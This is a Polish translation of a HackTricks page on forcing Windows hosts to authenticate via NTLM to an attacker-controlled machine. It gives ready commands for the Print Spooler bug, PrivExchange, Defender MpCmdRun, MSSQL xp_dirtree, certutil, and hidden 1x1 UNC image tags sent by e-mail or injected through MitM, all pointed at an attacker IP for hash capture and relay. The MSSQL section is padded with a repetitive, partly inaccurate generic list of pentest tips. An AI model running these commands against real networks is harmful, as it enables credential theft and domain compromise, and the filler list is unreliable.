# Wymuś uprzywilejowaną autoryzację NTLM

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Pracujesz w **firmie zajmującej się cyberbezpieczeństwem**? Chcesz zobaczyć swoją **firmę reklamowaną w HackTricks**? A może chcesz mieć dostęp do **najnowszej wersji PEASS lub pobrać HackTricks w formacie PDF**? Sprawdź [**PLAN SUBSKRYPCYJNY**](https://github.com/sponsors/carlospolop)!
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* **Dołącz do** [**💬**](https://emojipedia.org/speech-balloon/) [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** mnie na **Twitterze** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do repozytorium [hacktricks](https://github.com/carlospolop/hacktricks) i [hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

## SharpSystemTriggers

[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) to **zbiór** zdalnych **wyzwalaczy autoryzacji** napisanych w C# przy użyciu kompilatora MIDL w celu uniknięcia zależności od firm trzecich.

## Nadużycie usługi Spooler

Jeśli usługa _**Print Spooler**_ jest **włączona**, można użyć już znanych poświadczeń AD, aby **poprosić** serwer drukarki kontrolera domeny o **aktualizację** nowych zadań drukowania i po prostu powiedzieć mu, aby **wysłał powiadomienie do jakiegoś systemu**.\
Należy zauważyć, że gdy drukarka wysyła powiadomienie do dowolnego systemu, musi się ona **uwierzytelnić** na tym **systemie**. Dlatego atakujący może sprawić, że usługa _**Print Spooler**_ uwierzytelnia się na dowolnym systemie, a usługa ta **użyje konta komputera** w tej autoryzacji.

### Wyszukiwanie serwerów Windows w domenie

Za pomocą PowerShella można uzyskać listę maszyn z systemem Windows. Serwery zazwyczaj mają priorytet, więc skupmy się na nich:
```bash
Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (OperatingSystem -notlike "2016") -and (Enabled -eq "True")} -Properties * | select Name | ft -HideTableHeaders > servers.txt
```
### Wyszukiwanie nasłuchujących usług Spooler

Korzystając ze zmodyfikowanego narzędzia @mysmartlogin (Vincent Le Toux) [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket), sprawdź, czy usługa Spooler nasłuchuje:
```bash
. .\Get-SpoolStatus.ps1
ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
```
Możesz również użyć rpcdump.py na systemie Linux i szukać protokołu MS-RPRN.
```bash
rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
```
### Poproś usługę o uwierzytelnienie na dowolnym hoście

Możesz skompilować [**SpoolSample stąd**](https://github.com/NotMedic/NetNTLMtoSilverTicket)**.**
```bash
SpoolSample.exe <TARGET> <RESPONDERIP>
```
lub użyj [**dementor.py** od 3xocyte](https://github.com/NotMedic/NetNTLMtoSilverTicket) lub [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py) jeśli korzystasz z systemu Linux.
```bash
python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
```
### Kombinowanie z nieograniczonym przekazywaniem

Jeśli atakujący już skompromitował komputer z [nieograniczonym przekazywaniem](unconstrained-delegation.md), atakujący może **zmusić drukarkę do uwierzytelnienia się na tym komputerze**. Ze względu na nieograniczone przekazywanie, **TGT** konta **komputera drukarki** zostanie **zapisany w pamięci** komputera z nieograniczonym przekazywaniem. Ponieważ atakujący już skompromitował ten host, będzie w stanie **odzyskać ten bilet** i go wykorzystać ([Przekazanie biletu](pass-the-ticket.md)).

## RCP Wymuszanie uwierzytelnienia

{% embed url="https://github.com/p0dalirius/Coercer" %}

## PrivExchange

Atak `PrivExchange` jest wynikiem błędu znalezionego w funkcji **PushSubscription serwera Exchange**. Ta funkcja pozwala na wymuszenie uwierzytelnienia serwera Exchange przez dowolnego użytkownika domeny posiadającego skrzynkę pocztową do dowolnego hosta dostarczonego przez klienta za pośrednictwem protokołu HTTP.

Domyślnie **usługa Exchange działa jako SYSTEM** i ma nadmiernie przyznane uprawnienia (w szczególności ma **uprawnienia WriteDacl w domenie przed aktualizacją kumulacyjną 2019**). Ten błąd można wykorzystać do umożliwienia **przekazywania informacji do LDAP, a następnie wydobycia bazy danych NTDS domeny**. W przypadkach, gdy przekazywanie do LDAP nie jest możliwe, ten błąd nadal może być wykorzystany do przekazywania i uwierzytelniania na innych hostach w domenie. Pomyślne wykorzystanie tego ataku natychmiastowo przyznaje dostęp do konta Administratora domeny z dowolnym uwierzytelnionym kontem użytkownika domeny.

## Wewnątrz systemu Windows

Jeśli już jesteś wewnątrz maszyny z systemem Windows, możesz zmusić system Windows do połączenia się z serwerem za pomocą uprzywilejowanych kont przy użyciu:

### Defender MpCmdRun
```bash
C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -Scan -ScanType 3 -File \\<YOUR IP>\file.txt
```
### MSSQL

MSSQL (Microsoft SQL Server) to system zarządzania bazą danych opracowany przez firmę Microsoft. Jest szeroko stosowany w aplikacjach biznesowych do przechowywania i zarządzania danymi. Poniżej przedstawiam kilka przydatnych technik związanych z penetracją MSSQL.

#### 1. Słabe hasła

Wielu administratorów baz danych nadal używa słabych haseł do swoich kont MSSQL. Wykorzystaj narzędzia do łamania haseł, takie jak Hydra lub Medusa, aby przeprowadzić atak brute force i zdobyć dostęp do konta administratora.

#### 2. Słabe uprawnienia

Sprawdź, czy konta użytkowników mają nadmiarowe uprawnienia. Często zdarza się, że użytkownicy mają dostęp do funkcji, które nie są im potrzebne. Wykorzystaj te nadmiarowe uprawnienia, aby uzyskać dostęp do wrażliwych danych.

#### 3. Wykorzystanie podatności

Sprawdź, czy serwer MSSQL jest podatny na znane podatności. Możesz użyć narzędzi takich jak Metasploit, aby znaleźć i wykorzystać podatności w celu uzyskania dostępu do systemu.

#### 4. Ataki słownikowe

Wykorzystaj słownik ataków, aby przeprowadzić atak na konta użytkowników. Możesz użyć narzędzi takich jak SQLMap, aby automatycznie przeprowadzić atak słownikowy i zdobyć dostęp do konta.

#### 5. Ataki wstrzykiwania SQL

Sprawdź, czy aplikacja korzystająca z bazy danych MSSQL jest podatna na ataki wstrzykiwania SQL. Wykorzystaj narzędzia takie jak SQLMap, aby przetestować aplikację i znaleźć podatności.

#### 6. Ataki na serwer

Sprawdź, czy serwer MSSQL jest podatny na ataki sieciowe. Możesz użyć narzędzi takich jak Nmap, aby przeskanować serwer i znaleźć otwarte porty oraz podatności.

#### 7. Ataki na bazę danych

Sprawdź, czy baza danych MSSQL jest podatna na ataki. Możesz użyć narzędzi takich jak SQLMap, aby przetestować bazę danych i znaleźć podatności.

#### 8. Ataki na aplikację

Sprawdź, czy aplikacja korzystająca z bazy danych MSSQL jest podatna na ataki. Możesz użyć narzędzi takich jak Burp Suite, aby przetestować aplikację i znaleźć podatności.

#### 9. Ataki na dane

Sprawdź, czy dane przechowywane w bazie danych MSSQL są podatne na ataki. Możesz użyć narzędzi takich jak SQLMap, aby przetestować dane i znaleźć podatności.

#### 10. Ataki na infrastrukturę

Sprawdź, czy infrastruktura, na której działa serwer MSSQL, jest podatna na ataki. Możesz użyć narzędzi takich jak Nessus, aby przeskanować infrastrukturę i znaleźć podatności.
```sql
EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
```
Lub skorzystaj z tej innej techniki: [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)

### Certutil

Można użyć narzędzia certutil.exe (binarnego pliku podpisanego przez Microsoft) do wymuszenia uwierzytelniania NTLM:
```bash
certutil.exe -syncwithWU  \\127.0.0.1\share
```
## Wstrzykiwanie HTML

### Za pomocą poczty elektronicznej

Jeśli znasz **adres e-mail** użytkownika, który loguje się na maszynę, którą chcesz skompromitować, możesz po prostu wysłać mu **e-mail z obrazem 1x1**, takim jak
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
i kiedy go otworzy, spróbuje się uwierzytelnić.

### MitM

Jeśli możesz przeprowadzić atak typu MitM na komputerze i wstrzyknąć HTML na stronie, którą będzie widział, możesz spróbować wstrzyknąć obrazek o następującym wyglądzie na stronie:
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
## Łamanie NTLMv1

Jeśli możesz przechwycić wyzwania NTLMv1, przeczytaj tutaj, jak je złamać.\
_Pamiętaj, że aby złamać NTLMv1, musisz ustawić wyzwanie Responder na "1122334455667788"_

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Pracujesz w **firmie zajmującej się cyberbezpieczeństwem**? Chcesz zobaczyć **reklamę swojej firmy w HackTricks**? A może chcesz mieć dostęp do **najnowszej wersji PEASS lub pobrać HackTricks w formacie PDF**? Sprawdź [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* **Dołącz do** [**💬**](https://emojipedia.org/speech-balloon/) [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** mnie na **Twitterze** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do repozytorium [hacktricks](https://github.com/carlospolop/hacktricks) i [hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
